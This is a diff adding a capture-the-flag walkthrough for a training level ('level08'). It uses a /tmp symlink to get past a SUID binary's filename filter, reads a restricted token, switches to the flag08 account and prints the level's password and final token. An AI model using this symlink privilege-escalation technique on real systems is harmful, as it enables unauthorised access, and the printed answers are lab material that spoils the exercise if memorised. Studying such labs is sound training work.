@@ -1,0 +1,30 @@
+1. List files in the directory:
+   ll
+   # Output shows: level08 binary with SUID permissions and token file owned by flag08
+
+2. Try to read the token file directly:
+   ./level08 ~/token
+   # Output: You may not access '/home/user/level08/token'
+   # The binary blocks access to files containing "token" in the path
+
+3. Create a symbolic link to bypass the path filter:
+   ln -s ~/token /tmp/level08
+
+4. Access the token through the symbolic link:
+   ./level08 /tmp/level08
+   # Output: quif5eloekouj29ke0vouxean
+   # The path filter only checks the argument path, not the target
+
+5. Use the token as password to login as flag08:
+   su flag08
+   # Password: quif5eloekouj29ke0vouxean
+
+6. Get the final flag:
+   getflag
+   # Output: Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+
+TECHNIQUE: Symbolic link bypass of path-based access control
+VULNERABILITY: Path filtering that doesn't resolve symbolic links
+BYPASS: Created symlink with different path to access restricted file
+PASSWORD: quif5eloekouj29ke0vouxean
+TOKEN: 25749xKZ8L7DkSCwJkT9dyv6f
